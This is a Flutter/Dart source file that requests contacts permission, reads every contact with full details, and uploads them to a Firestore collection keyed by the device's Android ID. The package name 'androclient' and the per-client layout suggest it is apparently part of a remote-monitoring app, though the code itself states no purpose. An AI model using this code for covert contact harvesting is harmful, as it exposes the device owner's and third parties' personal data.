import 'package:androclient/constant/firebase.constant.dart';
import 'package:androclient/service/device.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:permission_handler/permission_handler.dart';

Future<PermissionStatus> _getContactPermission() async {
  final PermissionStatus contactPermission = await Permission.contacts.status;
  if (contactPermission == PermissionStatus.granted) {
    print('Permission granted');
  } else if (contactPermission == PermissionStatus.denied) {
    print(
        'Denied. Show a dialog with a reason and again ask for the permission.');
    final PermissionStatus askdpermission = await Permission.contacts.request();
    return askdpermission;
  } else if (contactPermission == PermissionStatus.permanentlyDenied) {
    print('Take the user to the settings page.');
    await openAppSettings();
  }
  return contactPermission;
}

Future<bool> getContacts() async {
  try {
    final PermissionStatus permissionStatus = await _getContactPermission();
    if (permissionStatus == PermissionStatus.granted) {
      List<Contact> contacts =
          await FlutterContacts.getContacts(withProperties: true);
      String? androidId = await getIdentity();
      if (androidId != null) {
        CollectionReference contactCollection =
            firestore.collection('client').doc(androidId).collection("contact");
        WriteBatch batch = firestore.batch();
        for (var i = 0; i < contacts.length; i++) {
          if (i % 300 == 0) {
            await batch.commit();
            batch = firestore.batch();
          }
          Map<String, dynamic> contactMap = contacts.elementAt(i).toJson();
          DocumentReference contactDocument =
              contactCollection.doc(contacts.elementAt(i).id);
          batch.set(contactDocument, contactMap);
        }
        await batch.commit();
      }
      return true;
    }
    return false;
  } catch (e) {
    return false;
  }
}
